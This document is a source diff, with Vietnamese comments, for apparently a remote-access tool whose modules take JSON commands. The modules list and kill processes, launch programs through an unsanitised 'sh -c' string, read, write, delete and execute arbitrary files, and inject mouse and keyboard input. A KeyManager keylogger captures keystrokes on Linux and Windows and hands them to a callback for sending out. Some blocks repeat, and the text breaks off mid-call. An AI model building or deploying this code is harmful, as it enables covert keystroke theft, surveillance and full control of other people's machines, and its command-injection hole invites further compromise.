+        if (cmd_file.is_open()) {
+            std::getline(cmd_file, exe_name);
+            
+            if (!exe_name.empty() && exe_name.back() == '\n') {
+                exe_name.pop_back();
+            }
+
+            std::string exe_lower = to_lower(exe_name);
+            
+            if (exe_lower.find(search_term) != std::string::npos) {
+                
+                if (kill(pid, SIGKILL) == 0) {
+                    killed++;
+                    killed_details.push_back(exe_name + " (" + pid_str + ")");
+                } else {
+                }
+            }
+        }
+        cmd_file.close();
+    }
+
+    closedir(proc_dir);
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"action", "KILL"},
+        {"data", {
+            {"keyword", keyword},
+            {"killed_count", killed},
+            {"details", killed_details}
+        }}
+    };
+}
+
+json AppManager::handle_command(const json& request) {
+    const std::string command = request.value("command", "");
+    json payload;
+    if (request.contains("payload")) payload = request["payload"];
+
+    if (command == "LIST") return list_apps();
+    
+    if (command == "KILL") {
+        std::string name = payload.value("name", "");
+        if (name.empty()) return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"error", "Missing name"}
+        };
+        return kill_app_by_name(name);
+    }
+
+    if (command == "START") {
+        std::string path = payload.value("path", "");
+        if (path.empty()) return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"error", "Missing path"}};
+        return start_app(path);
+    }
+
+    return {
+        {"status", "error"}, 
+        {"module", get_module_name()},
+        {"error", "Unknown APP command"}};
+}
+
+--
+#include "AppManager.hpp"
+
+static std::string to_lower(std::string s) {
+    std::transform(s.begin(), s.end(), s.begin(),
+                   [](unsigned char c){ return std::tolower(c); });
+    return s;
+}
+
+json AppManager::list_apps() {
+    json app_list = json::array();
+
+    DIR* proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        return {
+            {"status", "error"},
+            {"module", get_module_name()},
+            {"command", "LIST"},
+            {"error", "Could not open /proc directory"}
+        };
+    }
+
+    struct dirent* entry;
+    while ((entry = readdir(proc_dir)) != NULL) {
+        
+        if (entry->d_type != DT_DIR) {
+            continue;
+        }
+
+        const char* d_name = entry->d_name;
+        bool is_pid = true;
+        if (*d_name == '\0') is_pid = false; // Tên rỗng
+
+        while (*d_name) {
+            if (!std::isdigit(*d_name)) {
+                is_pid = false;
+                break;
+            }
+            d_name++;
+        }
+
+        if (is_pid) {
+            std::string pid_str(entry->d_name);
+            unsigned long pid = 0;
+            unsigned long threads = 0;
+            std::string name;
+
+            try {
+                pid = std::stoul(pid_str);
+            } catch (...) {
+                continue; // Bỏ qua nếu không phải số hợp lệ
+            }
+
+            std::ifstream comm_file("/proc/" + pid_str + "/comm");
+            if (comm_file.is_open()) {
+                std::getline(comm_file, name);
+            } else {
+                continue; 
+            }
+
+            std::ifstream status_file("/proc/" + pid_str + "/status");
+            std::string line;
+            if (status_file.is_open()) {
+                while (std::getline(status_file, line)) {
+                    // Tìm dòng bắt đầu bằng "Threads:"
+                    if (line.rfind("Threads:", 0) == 0) {
+                        std::stringstream ss(line);
+                        std::string key; // Đọc chữ "Threads:"
+                        ss >> key >> threads; // Đọc số lượng luồng
+                        break;
+                    }
+                }
+            }
+
+            app_list.push_back({
+                {"pid",     pid},
+                {"name",    name} 
+                // {"threads", threads}
+            });
+        }
+    }
+
+    closedir(proc_dir);
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"command", "LIST"},
+        {"data", app_list}
+    }; 
+}
+
+json AppManager::start_app(const std::string& app_name) { // Y như tạo một tiến  trình
+    int pipe_fd[2];
+    if (pipe(pipe_fd) == -1) {
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Failed to create pipe"} 
+        };
+    }
+
+    pid_t pid = fork();
+
+    if (pid == -1) {
+        close(pipe_fd[0]);
+        close(pipe_fd[1]);
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Fork failed"} 
+        };
+    }
+
+    if (pid == 0) {
+        close(pipe_fd[0]); // Con không đọc, đóng đầu đọc
+        dup2(pipe_fd[1], STDOUT_FILENO); // Chuyển hướng stdout
+        close(pipe_fd[1]); // Đóng fd gốc
+
+        std::string command = app_name + " & echo $!";
+        
+        execl("/bin/sh", "sh", "-c", command.c_str(), (char*) NULL);
+        
+        _exit(errno); 
+    }
+
+    close(pipe_fd[1]); // Cha không viết, đóng đầu viết
+
+    int status;
+    waitpid(pid, &status, 0); 
+
+    std::array<char, 32> buffer;
+    std::string real_pid_str;
+    ssize_t bytes_read = read(pipe_fd[0], buffer.data(), buffer.size() - 1);
+    
+    close(pipe_fd[0]); // Đọc xong, đóng đầu đọc
+
+    unsigned long real_pid = 0;
+
+    if (bytes_read > 0) {
+        buffer[bytes_read] = '\0'; // Đảm bảo kết thúc chuỗi
+        real_pid_str = buffer.data();
+        
+        real_pid_str.erase(
+            std::remove(real_pid_str.begin(), real_pid_str.end(), '\n'), 
+            real_pid_str.end()
+        );
+
+        try {
+            real_pid = std::stoul(real_pid_str);
+        } catch (...) {
+             return {
+                {"status", "error"}, 
+                {"module", get_module_name()}, 
+                {"action", "START"},
+                {"error", "Failed to parse PID from child"}
+            };
+        }
+    } else {
+         return {
+            {"status", "error"}, 
+            {"module", get_module_name()}, 
+            {"action", "START"},
+            {"error", "Child process returned no PID"}
+        };
+    }
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"action", "START"},
+        {"data", app_name}
+    };
+
+}
+
+// json AppManager::kill_app_by_name(const std::string& app_name) {
+// // Ngăn chặn các cuộc tấn công "command injection" cơ bản
+//     // Chỉ cho phép tên ứng dụng an toàn (chữ, số, dấu gạch ngang)
+//     std::string search_term = to_lower(app_name);
+//     if (search_term.empty() || search_term.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-") != std::string::npos) {
+//         return {
+//             {"status", "error"},
+//             {"module", get_module_name()},
+//             {"action", "KILL"},
+//             {"error", "Invalid application name"}
+//         };
+//     }
+//
+//     // Xây dựng lệnh: pkill -9 ten_ung_dung
+//     // -9 là SIGKILL, tương đương với kill_pid_impl của chúng ta
+//     std::string command = "pkill -9 " + app_name;
+//
+//     // Gọi lệnh hệ thống
+//     int result = system(command.c_str());
+//
+//     if (result == 0) {
+//         // pkill tìm thấy và đã kill thành công
+//         return {
+//             {"status", "success"},
+//             {"module", get_module_name()},
+//             {"action", "KILL"},
+//             {"data", app_name}
+//         };
+//     }
+//     // pkill thất bại (thường là do không tìm thấy tiến trình)
+//     return {
+//         {"status", "error"},
+//         {"module", get_module_name()},
+//         {"message", "Application not found or pkill failed"},
+//         {"data", app_name}
+//     };
+// } 
+
+json AppManager::kill_app_by_name(const std::string& keyword) {
+    int killed = 0;
+    std::vector<std::string> killed_details;
+    
+    std::string search_term = to_lower(keyword);
+    if (search_term.empty()) {
+         return {
+            {"status", "error"},
+            {"module", get_module_name()},
+            {"command", "KILL"},
+            {"error", "Keyword cannot be empty"}
+        };
+    }
+
+    DIR* proc_dir = opendir("/proc");
+    if (!proc_dir) {
+        return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"command", "KILL"},
+            {"error", "Cannot open /proc directory"}
+        };
+    }
+
+    pid_t my_pid = getpid();
+
+    struct dirent* entry;
+    
+    while ((entry = readdir(proc_dir)) != NULL) {
+        
+        if (entry->d_type != DT_DIR) continue;
+        if (!std::isdigit(entry->d_name[0])) continue;
+
+        std::string pid_str = entry->d_name;
+        int pid = std::stoi(pid_str);
+
+        if (pid == my_pid) continue;
+
+        std::string comm_path = "/proc/" + pid_str + "/comm";
+        std::ifstream cmd_file(comm_path);
+        std::string exe_name;
+
+        if (cmd_file.is_open()) {
+            std::getline(cmd_file, exe_name);
+            
+            if (!exe_name.empty() && exe_name.back() == '\n') {
+                exe_name.pop_back();
+            }
+
+            std::string exe_lower = to_lower(exe_name);
+            
+            if (exe_lower.find(search_term) != std::string::npos) {
+                
+                if (kill(pid, SIGKILL) == 0) {
+                    killed++;
+                    killed_details.push_back(exe_name + " (" + pid_str + ")");
+                } else {
+                }
+            }
+        }
+        cmd_file.close();
+    }
+
+    closedir(proc_dir);
+
+    return {
+        {"status", "success"},
+        {"module", get_module_name()},
+        {"action", "KILL"},
+        {"data", {
+            {"keyword", keyword},
+            {"killed_count", killed},
+            {"details", killed_details}
+        }}
+    };
+}
+
+json AppManager::handle_command(const json& request) {
+    const std::string command = request.value("command", "");
+    json payload;
+    if (request.contains("payload")) payload = request["payload"];
+
+    if (command == "LIST") return list_apps();
+    
+    if (command == "KILL") {
+        std::string name = payload.value("name", "");
+        if (name.empty()) return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"error", "Missing name"}
+        };
+        return kill_app_by_name(name);
+    }
+
+    if (command == "START") {
+        std::string path = payload.value("path", "");
+        if (path.empty()) return {
+            {"status", "error"}, 
+            {"module", get_module_name()},
+            {"error", "Missing path"}};
+        return start_app(path);
+    }
+
+    return {
+        {"status", "error"}, 
+        {"module", get_module_name()},
+        {"error", "Unknown APP command"}};
+}
+--
+// src/modules/AppManager.hpp
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <string>
+#include <vector>
+#include <nlohmann/json.hpp>
+#include <algorithm>
+#include <cctype>
+
+#if _WIN32
+#include <windows.h>
+#include <tlhelp32.h>
+#else
+#include <dirent.h> // for listing apps, processes
+#include <unistd.h> // unix system api
+#include <signal.h> // for killing apps, processes
+#include <fstream> 
+#include <wait.h> // wait for children processes
+#endif
+
+using nlohmann::json;
+
+class AppManager : public IRemoteModule {
+private:
+    std::string module_name_ = "APP";
+
+    // implement
+    json list_apps();
+    json kill_app_by_name(const std::string& exe_name);
+    json start_app(const std::string& path_or_exe);
+
+public:
+    AppManager() = default;
+
+    const std::string& get_module_name() const override {
+        return module_name_;
+    }
+
+    json handle_command(const json& request) override;
+};
+--
+#include "FileManager.hpp"
+#include <iostream>
+#include <fstream>
+
+// Hàm xử lý lệnh từ Client (bắt buộc do kế thừa IRemoteModule)
+json FileManager::handle_command(const json& request) {
+    return {
+        {"status", "error"}, 
+        {"message", "[Linux] FileManager chưa được hỗ trợ đầy đủ."}
+    };
+}
+
+// Hàm đọc file nhị phân (Main đang gọi hàm này)
+// Tôi viết tạm logic đọc file cơ bản để bạn dùng được luôn nếu cần
+bool FileManager::read_file_binary(const std::string& filepath, std::vector<uint8_t>& out_buffer) {
+    std::ifstream file(filepath, std::ios::binary);
+    if (!file.is_open()) {
+        return false;
+    }
+
+    // Lấy kích thước file
+    file.seekg(0, std::ios::end);
+    size_t fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Đọc dữ liệu
+    out_buffer.resize(fileSize);
+    file.read(reinterpret_cast<char*>(out_buffer.data()), fileSize);
+    
+    return true;
+}
+--
+#include "FileManager.hpp"
+#include <iostream>
+#include <fstream>
+#include <filesystem>
+#include <vector>
+#include <algorithm>
+#include <sstream> // Cho string stream
+#ifdef _WIN32
+#include <windows.h>
+#include <shellapi.h> // <--- Bắt buộc để dùng ShellExecute
+#endif
+namespace fs = std::filesystem;
+
+// --- HELPER: BASE64 DECODE (Để nhận video từ JSON) ---
+static const std::string base64_chars = 
+             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+             "abcdefghijklmnopqrstuvwxyz"
+             "0123456789+/";
+
+static bool is_base64(unsigned char c) {
+  return (isalnum(c) || (c == '+') || (c == '/'));
+}
+
+std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
+  int in_len = encoded_string.size();
+  int i = 0; int j = 0; int in_ = 0;
+  unsigned char char_array_4[4], char_array_3[3];
+  std::vector<unsigned char> ret;
+
+  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
+    char_array_4[i++] = encoded_string[in_]; in_++;
+    if (i ==4) {
+      for (i = 0; i <4; i++)
+        char_array_4[i] = base64_chars.find(char_array_4[i]);
+      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+      for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
+      i = 0;
+    }
+  }
+  if (i) {
+    for (j = i; j <4; j++) char_array_4[j] = 0;
+    for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
+    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+    for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
+  }
+  return ret;
+}
+
+// ----------------------------------------------------
+
+json FileManager::handle_command(const json& request) {
+    std::string cmd = request.value("command", "");
+    
+    // 1. LIST_DIR (Liệt kê file/ổ đĩa)
+    if (cmd == "LIST_DIR") {
+        json file_list = json::array();
+        std::string req_path = "";
+        if (request.contains("payload") && request["payload"].contains("path")) {
+            req_path = request["payload"]["path"];
+        }
+
+        // Nếu path rỗng -> Trả về danh sách ổ đĩa (C:\, D:\)
+        if (req_path.empty()) {
+            #ifdef _WIN32
+                char buffer[256];
+                GetLogicalDriveStringsA(256, buffer);
+                char* drive = buffer;
+                while (*drive) {
+                    file_list.push_back({ {"name", std::string(drive)}, {"type", "drive"}, {"path", std::string(drive)} });
+                    drive += strlen(drive) + 1;
+                }
+                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, {"current_path", ""}, {"data", file_list}};
+            #else
+                req_path = "/";
+            #endif
+        }
+
+        try {
+            if (fs::exists(req_path) && fs::is_directory(req_path)) {
+                for (const auto& entry : fs::directory_iterator(req_path)) {
+                    try {
+                        std::string filename = entry.path().filename().string();
+                        std::string type = entry.is_directory() ? "dir" : "file";
+                        uintmax_t size = (!entry.is_directory()) ? entry.file_size() : 0;
+                        
+                        // Detect extension
+                        std::string ext = entry.path().extension().string();
+                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+                        if(ext == ".webm" || ext == ".mp4") type = "video";
+                        if(ext == ".jpg" || ext == ".png") type = "image";
+
+                        file_list.push_back({
+                            {"name", filename}, {"type", type}, {"size", size}, {"path", entry.path().string()}
+                        });
+                    } catch (...) { continue; }
+                }
+                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, 
+                        {"current_path", fs::absolute(req_path).string()}, {"data", file_list}};
+            }
+        } catch (const std::exception& e) { return {{"status", "error"}, {"message", e.what()}}; }
+    }
+
+    // 2. READ_TEXT (Đọc nội dung file gửi về Client sửa)
+    else if (cmd == "READ_TEXT") {
+        std::string path = request["payload"].value("path", "");
+        std::ifstream file(path);
+        if (file.is_open()) {
+            std::stringstream buffer;
+            buffer << file.rdbuf();
+            return {
+                {"status", "success"}, 
+                {"module", "FILE"}, 
+                {"command", "READ_TEXT"}, 
+                {"path", path},
+                {"content", buffer.str()} // Nội dung file
+            };
+        }
+        return {{"status", "error"}, {"message", "Cannot open file"}};
+    }
+
+    // 3. WRITE_TEXT (Ghi đè nội dung file - Cẩn thận khi dùng!)
+    else if (cmd == "WRITE_TEXT") {
+        std::string path = request["payload"].value("path", "");
+        std::string content = request["payload"].value("content", "");
+        
+        std::ofstream file(path, std::ios::trunc); // Truncate = Xóa cũ ghi mới
+        if (file.is_open()) {
+            file << content;
+            return {{"status", "success"}, {"message", "File saved successfully"}};
+        }
+        return {{"status", "error"}, {"message", "Cannot write file (Access Denied?)"}};
+    }
+
+    // 4. EXECUTE (Chạy file .exe, .bat...)
+    else if (cmd == "EXECUTE") {
+        std::string path = request["payload"].value("path", "");
+        #ifdef _WIN32
+            ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
+            return {{"status", "success"}, {"message", "Executed"}};
+        #endif
+    }
+
+    // 5. DELETE (Xóa file/folder)
+    else if (cmd == "DELETE") {
+        std::string path = request["payload"].value("path", "");
+        try {
+            if (fs::remove_all(path)) return {{"status", "success"}, {"message", "Deleted"}};
+        } catch (...) {}
+        return {{"status", "error"}, {"message", "Delete failed"}};
+    }
+
+    // 1. LIST: Liệt kê cả ảnh và video
+    if (cmd == "LIST") {
+        json file_list = json::array();
+        std::string path = "captured_data";
+        if (!fs::exists(path)) fs::create_directory(path);
+
+        if (fs::exists(path) && fs::is_directory(path)) {
+            for (const auto& entry : fs::directory_iterator(path)) {
+                std::string ext = entry.path().extension().string();
+                if (ext == ".jpg" || ext == ".webm" || ext == ".mp4") {
+                    file_list.push_back({
+                        {"name", entry.path().filename().string()},
+                        {"size", entry.file_size()},
+                        {"type", (ext == ".jpg" ? "image" : "video")}
+                    });
+                }
+            }
+        }
+        return {
+            {"status", "success"}, {"module", "FILE"},
+            {"command", "LIST"}, {"data", file_list}
+        };
+    }
+
+    // [MỚI] LỆNH THỰC THI FILE (Mở file trên máy Server)
+    if (cmd == "EXECUTE") {
+        std::string path = request["payload"].value("path", "");
+        
+        if (path.empty()) return {{"status", "error"}, {"message", "Missing path"}};
+
+        #ifdef _WIN32
+            // ShellExecute tự động chọn ứng dụng phù hợp để mở file
+            // (VD: .txt mở bằng Notepad, .png mở bằng Photos, .exe thì chạy luôn)
+            HINSTANCE result = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
+            
+            if ((intptr_t)result > 32) {
+                return {{"status", "success"}, {"message", "File executed successfully"}};
+            } else {
+                return {{"status", "error"}, {"message", "Failed to execute file"}};
+            }
+        #else
+            // Code đơn giản cho Linux (nếu cần)
+            std::string cmd_linux = "xdg-open \"" + path + "\" &";
+            system(cmd_linux.c_str());
+            return {{"status", "success"}, {"message", "Executed command"}};
+        #endif
+    }
+    
+    // 2. SAVE_VIDEO: Nhận video từ Client và lưu xuống ổ cứng
+    else if (cmd == "SAVE_VIDEO") {
+        if (request.contains("payload")) {
+            std::string name = request["payload"].value("name", "video.webm");
+            std::string b64Data = request["payload"].value("data", "");
+            
+            if (!b64Data.empty()) {
+                std::vector<unsigned char> binaryData = base64_decode(b64Data);
+                
+                std::string path = "captured_data/" + name;
+                std::ofstream file(path, std::ios::binary);
+                if (file.is_open()) {
+                    file.write(reinterpret_cast<const char*>(binaryData.data()), binaryData.size());
+                    file.close();
+                    std::cout << "[FILE] Video saved: " << path << " (" << binaryData.size() << " bytes)\n";
+                    return {{"status", "success"}, {"message", "Video saved successfully"}};
+                }
+            }
+        }
+        return {{"status", "error"}, {"message", "Failed to save video"}};
+    }
+
+    return {{"status", "ok"}}; 
+}
+
+// Giữ nguyên hàm read_file_binary cũ
+bool FileManager::read_file_binary(const std::string& filename, std::vector<uint8_t>& out_data) {
+    std::string full_path = "captured_data/" + filename;
+    std::ifstream file(full_path, std::ios::binary);
+    if (!file.is_open()) return false;
+    file.seekg(0, std::ios::end);
+    size_t size = file.tellg();
+    file.seekg(0, std::ios::beg);
+    out_data.resize(size);
+    file.read(reinterpret_cast<char*>(out_data.data()), size);
+    return true;
+}
+--
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <string>
+#include <vector>
+#include <nlohmann/json.hpp>
+
+class FileManager : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override {
+        static const std::string name = "FILE";
+        return name;
+    }
+
+    json handle_command(const json& request) override;
+
+    // Hàm hỗ trợ đọc file nhị phân (Static để Main gọi dễ dàng)
+    static bool read_file_binary(const std::string& filename, std::vector<uint8_t>& out_data);
+};
+--
+#include "InputManager.hpp"
+#include <iostream>
+
+// Helper lấy độ phân giải (chỉ dùng để tham khảo debug nếu cần, không dùng để tính toán toạ độ)
+static int GetScreenWidth() { return GetSystemMetrics(SM_CXSCREEN); }
+static int GetScreenHeight() { return GetSystemMetrics(SM_CYSCREEN); }
+
+json InputManager::handle_command(const json& request) {
+    std::string cmd = request.value("command", "");
+    json p = request.value("payload", json::object());
+
+    if (cmd == "MOUSE_MOVE") {
+        // Nhận toạ độ tỉ lệ từ 0.0 đến 1.0 từ Client
+        move_mouse(p.value("x", 0.0), p.value("y", 0.0));
+    }
+    else if (cmd == "MOUSE_BTN") {
+        mouse_btn(p.value("btn", "left"), p.value("type", "down"));
+    }
+    else if (cmd == "MOUSE_WHEEL") {
+        mouse_scroll(p.value("delta", 0));
+    }
+    else if (cmd == "KEY_EVENT") {
+        bool is_down = (p.value("type", "up") == "down");
+        int key = p.value("key", 0);
+        key_event(key, is_down);
+    }
+    return {{"status", "ok"}};
+}
+
+// 1. DI CHUYỂN CHUỘT (SỬA LẠI ĐỂ KHẮC PHỤC LỆCH DPI)
+void InputManager::move_mouse(double x, double y) {
+    // Windows SendInput sử dụng hệ toạ độ tuyệt đối từ 0 đến 65535 cho toàn bộ màn hình
+    // Bất kể độ phân giải là 1920x1080 hay 4K, toạ độ 65535,65535 luôn là góc dưới phải.
+    // Việc này giúp tránh sai số do DPI Scaling (Zoom 125%, 150%) của Windows.
+    
+    int absX = static_cast<int>(x * 65535);
+    int absY = static_cast<int>(y * 65535);
+
+    INPUT input = {0};
+    input.type = INPUT_MOUSE;
+    // MOUSEEVENTF_ABSOLUTE: Chỉ định dùng toạ độ tuyệt đối (0-65535)
+    // MOUSEEVENTF_VIRTUALDESK: Hỗ trợ đa màn hình (nếu có)
+    input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;
+    input.mi.dx = absX;
+    input.mi.dy = absY;
+    
+    SendInput(1, &input, sizeof(INPUT));
+}
+
+// 2. CLICK CHUỘT
+void InputManager::mouse_btn(const std::string& btn, const std::string& action) {
+    INPUT input = {0};
+    input.type = INPUT_MOUSE;
+    
+    if (btn == "left") {
+        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
+    } else if (btn == "right") {
+        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP;
+    } else if (btn == "middle") {
+        input.mi.dwFlags = (action == "down") ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP;
+    }
+    SendInput(1, &input, sizeof(INPUT));
+}
+
+// 3. LĂN CHUỘT
+void InputManager::mouse_scroll(int delta) {
+    INPUT input = {0};
+    input.type = INPUT_MOUSE;
+    input.mi.dwFlags = MOUSEEVENTF_WHEEL;
+    input.mi.mouseData = (DWORD)delta;
+    SendInput(1, &input, sizeof(INPUT));
+}
+
+// 4. BÀN PHÍM
+void InputManager::key_event(int vk_code, bool is_down) {
+    INPUT input = {0};
+    input.type = INPUT_KEYBOARD;
+    input.ki.wVk = (WORD)vk_code;
+    
+    if (!is_down) {
+        input.ki.dwFlags = KEYEVENTF_KEYUP;
+    }
+    SendInput(1, &input, sizeof(INPUT));
+}
+--
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+
+// --- PHÂN CHIA HỆ ĐIỀU HÀNH ---
+#if defined(_WIN32)
+    #include <windows.h>
+#elif defined(__linux__)
+    #include <X11/Xlib.h>
+    #include <X11/extensions/XTest.h> // Thư viện giả lập Input trên Linux
+#endif
+// ------------------------------
+
+class InputManager : public IRemoteModule {
+public:
+    const std::string& get_module_name() const override {
+        static const std::string name = "INPUT";
+        return name;
+    }
+
+    json handle_command(const json& request) override;
+
+private:
+    void move_mouse(double x, double y); // Nhận toạ độ tỉ lệ 0.0 -> 1.0
+    void mouse_btn(const std::string& btn, const std::string& action); // left/right, down/up
+    void mouse_scroll(int delta);
+    void key_event(int key_code, bool is_down);
+};
+--
+#include "KeyManager.hpp"
+#include <iostream>
+
+json KeyManager::handle_command(const json& request) {
+    std::string command = request.value("command", "");
+    
+    if (command == "START") {
+        start_hook();
+        return {
+            {"status", "success"}, 
+            {"module", get_module_name()},
+            {"data", "Keylogger started"}};
+    }
+    if (command == "STOP") {
+        stop_hook();
+        return {
+            {"status", "success"}, 
+            {"module", get_module_name()},
+            {"error", "Keylogger stopped"}};
+    }
+
+    return {
+        {"status", "error"}, 
+        {"module", get_module_name()},
+        {"error", "Unknown command"}};
+}
+
+static KeyCallback g_callback = nullptr;
+static std::atomic<bool> g_running{false};
+static int g_fd = -1; // File descriptor của thiết bị bàn phím
+
+static std::map<int, std::string> g_keyMap = {
+    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
+    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
+    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
+    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
+    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"}, {KEY_Z, "z"},
+    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
+    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
+    {KEY_ENTER, "[ENTER]\n"}, {KEY_SPACE, " "}, {KEY_BACKSPACE, "[BACKSPACE]"},
+    {KEY_TAB, "[TAB]"}, {KEY_ESC, "[ESC]"}, {KEY_LEFTSHIFT, "[SHIFT]"}, {KEY_RIGHTSHIFT, "[SHIFT]"},
+    {KEY_DOT, "."}, {KEY_COMMA, ","}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
+    {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"}
+};
+
+std::string find_keyboard_device() {
+    const std::string path_dir = "/dev/input/by-path/";
+    DIR* dir = opendir(path_dir.c_str());
+    if (!dir) return "";
+
+    struct dirent* entry;
+    std::string device_path = "";
+
+    while ((entry = readdir(dir)) != NULL) {
+        std::string filename = entry->d_name;
+        // Tìm file kết thúc bằng "-event-kbd"
+        if (filename.length() > 10 && 
+            filename.substr(filename.length() - 10) == "-event-kbd") {
+            device_path = path_dir + filename;
+            break;
+        }
+    }
+    closedir(dir);
+    
+    if (device_path.empty()) return "/dev/input/event0";
+    return device_path;
+}
+
+void hook_loop() {
+    std::string dev_path = find_keyboard_device();
+
+    g_fd = open(dev_path.c_str(), O_RDONLY);
+    if (g_fd == -1) {
+        g_running = false;
+        return;
+    }
+
+    struct input_event ev;
+    int i = 0;
+    
+    while (g_running) {
+        std::cout << i++ << "\n"; 
+        ssize_t n = read(g_fd, &ev, sizeof(ev));
+        if (n == (ssize_t)-1 || !g_running) {
+            break; 
+        }
+
+        if (ev.type == EV_KEY && ev.value == 1) {
+            if (g_keyMap.count(ev.code)) {
+                std::string key = g_keyMap[ev.code];
+                
+                if (g_callback) {
+                    g_callback(key);
+                }
+            }
+        }
+    }
+
+    if (g_fd != -1) {
+        close(g_fd);
+        g_fd = -1;
+    }
+}
+
+void KeyManager::set_callback(KeyCallback cb) {
+    g_callback = cb;
+}
+
+void KeyManager::start_hook() {
+    if (g_running) return; // Đang chạy rồi thì bỏ qua
+    
+    g_running = true;
+    
+    hookThread = std::thread(hook_loop);
+    hookThread.detach(); // Tách thread để nó chạy ngầm
+}
+
+void KeyManager::stop_hook() {
+    if (!g_running) return;
+
+    g_running = false;
+
+    if (g_fd != -1) {
+        close(g_fd); // Dòng này sẽ làm lệnh read() bên kia trả về lỗi và thoát vòng lặp
+        g_fd = -1;
+    }
+}
+
+--
+// KeyManager_win.cpp
+#include "KeyManager.hpp"
+#include <iostream>
+#include <vector>
+
+// --- BIẾN TOÀN CỤC (BẮT BUỘC ĐỂ HOOK HOẠT ĐỘNG) ---
+static HHOOK g_hHook = NULL;
+static KeyCallback g_callback = nullptr; // Hàm callback để gửi dữ liệu ra ngoài
+static bool g_isLocked = false; // [MỚI] Biến trạng thái khóa
+
+// --- HÀM TIỆN ÍCH: CHUYỂN ĐỔI VK_CODE SANG STRING (CÓ XỬ LÝ SHIFT/CAPS) ---
+static std::string ConvertVKCodeToString(DWORD vkCode) {
+    // 1. Xử lý các phím đặc biệt để dễ đọc log
+    if (vkCode == VK_RETURN) return "[ENTER]\n";
+    if (vkCode == VK_BACK)   return "[BACKSPACE]";
+    if (vkCode == VK_TAB)    return "[TAB]";
+    if (vkCode == VK_SPACE)  return " ";
+    if (vkCode == VK_ESCAPE) return "[ESC]";
+    if (vkCode >= VK_F1 && vkCode <= VK_F12) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
+    if (vkCode == VK_CAPITAL) return "[CAPS]";
+    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return "[CTRL]";
+    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) return "[SHIFT]";
+    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return "[ALT]"; // VK_MENU là ALT
+    
+    // Bỏ qua các phím điều hướng (Arrow keys, Insert, Delete, Home, End, PageUp/Down)
+    if ((vkCode >= VK_PRIOR && vkCode <= VK_DOWN) || vkCode == VK_INSERT || vkCode == VK_DELETE) return ""; 
+
+    // 2. Lấy trạng thái bàn phím (để biết có đang bật CapsLock hay giữ Shift không)
+    std::vector<BYTE> keyState(256);
+    // Cần gọi GetKeyboardState trước để ToUnicodeEx hoạt động chính xác
+    if (!GetKeyboardState(keyState.data())) return "";
+
+    // 3. Dùng ToUnicodeEx để chuyển đổi chính xác
+    WCHAR buffer[16] = {0};
+    HKL keyboardLayout = GetKeyboardLayout(0);
+
+    int result = ToUnicodeEx(
+        vkCode,
+        MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
+        keyState.data(),
+        buffer,
+        _countof(buffer),
